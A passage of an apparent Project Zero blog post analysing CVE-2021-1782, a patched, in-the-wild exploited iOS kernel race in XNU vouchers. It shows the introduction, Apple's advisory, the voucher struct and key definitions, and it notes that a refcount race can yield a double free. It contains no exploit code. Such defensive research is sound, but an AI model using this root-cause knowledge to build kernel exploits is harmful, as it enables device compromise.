<?xml version='1.0' encoding='UTF-8'?><?xml-stylesheet href="http://www.blogger.com/styles/atom.css" type="text/css"?><entry xmlns='http://www.w3.org/2005/Atom' xmlns:blogger='http://schemas.google.com/blogger/2008' xmlns:georss='http://www.georss.org/georss' xmlns:gd='http://schemas.google.com/g/2005' xmlns:thr='http://purl.org/syndication/thread/1.0'><id>tag:blogger.com,1999:blog-4838136820032157985.post-5933797027217125856</id><published>2022-04-14T08:58:00.002-07:00</published><updated>2022-08-24T12:02:07.319-07:00</updated><title type='text'>CVE-2021-1782, an iOS in-the-wild vulnerability in vouchers</title><content type='html'>&lt;style type=&quot;text/css&quot;&gt;@import url(&#39;https://themes.googleusercontent.com/fonts/css?kit=lhDjYqiy3mZ0x6ROQEUoUw&#39;);ol{margin:0;padding:0}table td,table th{padding:0}.BGLtzooHlW-c13{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#e0e0e0;border-top-width:1pt;border-right-width:1pt;border-left-color:#e0e0e0;vertical-align:top;border-right-color:#e0e0e0;border-left-width:1pt;border-top-style:solid;background-color:#fafafa;border-left-style:solid;border-bottom-width:1pt;width:468pt;border-top-color:#e0e0e0;border-bottom-style:solid}.BGLtzooHlW-c3{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:10pt;font-family:Consolas,&quot;Courier New&quot;;font-style:normal}.BGLtzooHlW-c10{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:&quot;Arial&quot;;font-style:normal}.BGLtzooHlW-c20{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:16pt;font-family:&quot;Arial&quot;;font-style:normal}.BGLtzooHlW-c26{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:&quot;Arial&quot;}.BGLtzooHlW-c9{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;font-weight:700;text-decoration:underline}.BGLtzooHlW-c18{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;text-align:left}.BGLtzooHlW-c19{color:#000000;text-decoration:none;vertical-align:baseline;font-size:11pt;font-style:normal}.BGLtzooHlW-c16{font-size:10pt;font-family:Consolas,&quot;Courier New&quot;;color:#0f9d58;font-weight:400}.BGLtzooHlW-c2{font-size:10pt;font-family:Consolas,&quot;Courier New&quot;;color:#616161;font-weight:400}.BGLtzooHlW-c7{font-size:10pt;font-family:Consolas,&quot;Courier New&quot;;color:#455a64;font-weight:400}.BGLtzooHlW-c0{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:left}.BGLtzooHlW-c4{font-size:10pt;font-family:Consolas,&quot;Courier New&quot;;color:#000000;font-weight:400}.BGLtzooHlW-c15{font-size:10pt;font-family:Consolas,&quot;Courier New&quot;;color:#c53929;font-weight:400}.BGLtzooHlW-c21{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.BGLtzooHlW-c24{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:center}.BGLtzooHlW-c6{font-size:10pt;font-family:Consolas,&quot;Courier New&quot;;color:#9c27b0;font-weight:400}.BGLtzooHlW-c12{border-spacing:0;border-collapse:collapse;margin-right:auto}.BGLtzooHlW-c27{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.BGLtzooHlW-c25{color:inherit;text-decoration:inherit}.BGLtzooHlW-c11{font-weight:400;font-family:&quot;Courier New&quot;}.BGLtzooHlW-c5{orphans:2;widows:2}.BGLtzooHlW-c1{height:0pt}.BGLtzooHlW-c14{font-style:italic}.BGLtzooHlW-c28{vertical-align:super}.BGLtzooHlW-c8{height:11pt}.BGLtzooHlW-c17{font-weight:700}.BGLtzooHlW-c22{margin-left:36pt}.BGLtzooHlW-c23{background-color:#00ff00}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:&quot;Arial&quot;}p{margin:0;color:#000000;font-size:11pt;font-family:&quot;Arial&quot;}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class=&quot;BGLtzooHlW-c27&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;Posted by Ian Beer, Google Project Zero&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c17&quot;&gt;This blog post is my analysis of a vulnerability exploited in the wild and patched in early 2021. Like the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c9&quot;&gt;&lt;a class=&quot;BGLtzooHlW-c251&quot; href=&quot;https://googleprojectzero.blogspot.com/2022/04/cve-2021-30737-xerubs-2021-ios-asn1.html&quot;&gt;writeup published last week&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c17&quot;&gt;&amp;nbsp;looking at an ASN.1 parser bug, this blog post is based on the notes I took as I was analyzing the patch and trying to understand the XNU vouchers subsystem. I hope that this writeup serves as the missing documentation for how some of the internals of the voucher subsystem works and its quirks which lead to this vulnerability.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;CVE-2021-1782 was fixed in iOS 14.4, as noted by &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c21&quot;&gt;&lt;a class=&quot;BGLtzooHlW-c251&quot; href=&quot;https://twitter.com/s1guza/status/1354575808547999744&quot;&gt;@s1guza on twitter&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c5 BGLtzooHlW-c24&quot;&gt;&lt;/p&gt;
  
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhTx_FjnSHTtPtnk2F1K8-AYcTnVrIBNV8PNJQgZCOhfoIvU6hD7teqA3Jmb8T8KtIpnIYKuUqa28P-pt-yM2zUsWppkcmdx18pAP8r0XTQH4JHAhpNZkC2uALpz_Pn5_OXK3mXlblNG1i6TIEtLsksgez8GlLTi2zuxP0haGXzaU1XGEj2RQeNjOto/s1182/image1%20%283%29%281%29.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhTx_FjnSHTtPtnk2F1K8-AYcTnVrIBNV8PNJQgZCOhfoIvU6hD7teqA3Jmb8T8KtIpnIYKuUqa28P-pt-yM2zUsWppkcmdx18pAP8r0XTQH4JHAhpNZkC2uALpz_Pn5_OXK3mXlblNG1i6TIEtLsksgez8GlLTi2zuxP0haGXzaU1XGEj2RQeNjOto/s1182/image1%20%283%29%281%29.png&quot; border=&quot;0&quot; alt=&quot;&amp;quot;So iOS 14.4 added locks around this code bit (user_data_get_value() in ipc_voucher.c). &amp;quot;e_made&amp;quot; seems to function as a refcount, and you should be able to race this with itself and cause some refs to get lost, eventually giving you a double free&amp;quot;&quot; style=&quot;max-height: 750; max-width: 600px;&quot; title=&quot;&amp;quot;So iOS 14.4 added locks around this code bit (user_data_get_value() in ipc_voucher.c). &amp;quot;e_made&amp;quot; seems to function as a refcount, and you should be able to race this with itself and cause some refs to get lost, eventually giving you a double free&amp;quot;&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;This vulnerability was fixed on January 26th 2021, and Apple updated the iOS 14.4 release notes on May 28th 2021 to indicate that the issue may have been actively exploited:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;/p&gt;
  
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgz_bD89bznHVJLkW_Kbwy-1JEoHaUyMfeaqDbpVjRTQ366r8ywGgSGps2aPyFa05wBuKWqAi2hJmm76dnbcgoV4YCFug4UWu3OhkHPgKjg6coamg35AId8VsOw5gkIHldyvefgRSX0klbhJ275wnwri6dzSTb_OZwwz2LeUeVjmHIAPsyirypsYonn/s1660/image2%20%282%29%281%29.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgz_bD89bznHVJLkW_Kbwy-1JEoHaUyMfeaqDbpVjRTQ366r8ywGgSGps2aPyFa05wBuKWqAi2hJmm76dnbcgoV4YCFug4UWu3OhkHPgKjg6coamg35AId8VsOw5gkIHldyvefgRSX0klbhJ275wnwri6dzSTb_OZwwz2LeUeVjmHIAPsyirypsYonn/s1200/image2%20%282%29%281%29.png&quot; border=&quot;0&quot; alt=&quot;Kernel. Available for: iPhone 6s and later, iPad Pro (all models), iPad Air 2 and later, iPad 5th generation and later, iPad mini 4 and later, and iPod touch (7th generation). Impact: A Malicious application may be able to elevate privileges. Apple is aware of a report that this issue may have been actively exploited. Description: A race condition was addressed with improved locking. CVE-2021-1772: an anonymous researcher. Entry updated May 28, 2021&quot; style=&quot;max-height: 750; max-width: 600px;&quot; title=&quot;Kernel. Available for: iPhone 6s and later, iPad Pro (all models), iPad Air 2 and later, iPad 5th generation and later, iPad mini 4 and later, and iPod touch (7th generation). Impact: A Malicious application may be able to elevate privileges. Apple is aware of a report that this issue may have been actively exploited. Description: A race condition was addressed with improved locking. CVE-2021-1772: an anonymous researcher. Entry updated May 28, 2021&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;h2 class=&quot;BGLtzooHlW-c18 BGLtzooHlW-c5&quot; id=&quot;h.iaaooqfddqk2&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c20&quot;&gt;Vouchers&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;What exactly is a voucher?&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;The kernel code has a concise description:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c22&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c14 BGLtzooHlW-c26&quot;&gt;Vouchers are a reference counted immutable (once-created) set of indexes to particular resource manager attribute values (which themselves are reference counted).&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;That definition is technically correct, though perhaps not all that helpful by itself.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;To actually understand the root cause and exploitability of this vulnerability is going to require covering a lot of the voucher codebase. This part of XNU is pretty obscure, and pretty complicated.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;A voucher is a reference-counted table of keys and values.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Pointers to all created vouchers are stored in the global &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivht_bucket&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;hash table.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;For a particular set of keys and values there should only be one voucher object. During the creation of a voucher there is a deduplication stage where the new voucher is compared against all existing vouchers in the hashtable to ensure they remain unique, returning a reference to the existing voucher if a duplicate has been found.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;Here&amp;#39;s the structure of a voucher:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.172bf3f0517e74698dccf6803d0a7cba3e4db4b2&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.0&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;ipc_voucher &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; iv_index_t &amp;nbsp; &amp;nbsp; iv_hash&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* checksum hash */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; iv_index_t &amp;nbsp; &amp;nbsp; iv_sum&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* checksum of values */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; os_refcnt_t &amp;nbsp; &amp;nbsp;iv_refs&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* reference count */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; iv_index_t &amp;nbsp; &amp;nbsp; iv_table_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* size of the voucher table */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; iv_index_t &amp;nbsp; &amp;nbsp; iv_inline_table&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;IV_ENTRIES_INLINE&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;];&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; iv_entry_t &amp;nbsp; &amp;nbsp; iv_table&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* table of voucher attr entries */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; ipc_port_t &amp;nbsp; &amp;nbsp; iv_port&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* port representing the voucher */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; queue_chain_t &amp;nbsp;iv_hash_link&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* link on hash chain */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;};&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;#define&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;IV_ENTRIES_INLINE MACH_VOUCHER_ATTR_KEY_NUM_WELL_KNOWN&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;The voucher codebase is written in a very generic, extensible way, even though its actual use and supported feature set is quite minimal.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=&quot;BGLtzooHlW-c18 BGLtzooHlW-c5&quot; id=&quot;h.ws3slh7jndn7&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c20&quot;&gt;Keys&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;Keys in vouchers are not arbitrary. Keys are &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c17&quot;&gt;indexes&lt;/span&gt;&lt;span&gt;&amp;nbsp;into a voucher&amp;#39;s &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;iv_table&lt;/span&gt;&lt;span&gt;; a value&amp;#39;s position in the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;iv_table&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;table determines what &amp;quot;key&amp;quot; it was stored under. Whilst the vouchers codebase supports the runtime addition of new key types this feature isn&amp;#39;t used and there are just a small number of fixed, well-known keys:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.bb8dc8863bbdd47aa96ca2a52c637e312485af31&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.1&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;#define&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;MACH_VOUCHER_ATTR_KEY_ALL &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;mach_voucher_attr_key_t&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)~&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;#define&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;MACH_VOUCHER_ATTR_KEY_NONE &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;mach_voucher_attr_key_t&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* other well-known-keys will be added here */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;#define&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;MACH_VOUCHER_ATTR_KEY_ATM &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;mach_voucher_attr_key_t&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;#define&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;MACH_VOUCHER_ATTR_KEY_IMPORTANCE &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;mach_voucher_attr_key_t&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;#define&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;MACH_VOUCHER_ATTR_KEY_BANK &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;mach_voucher_attr_key_t&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;/p&gt;
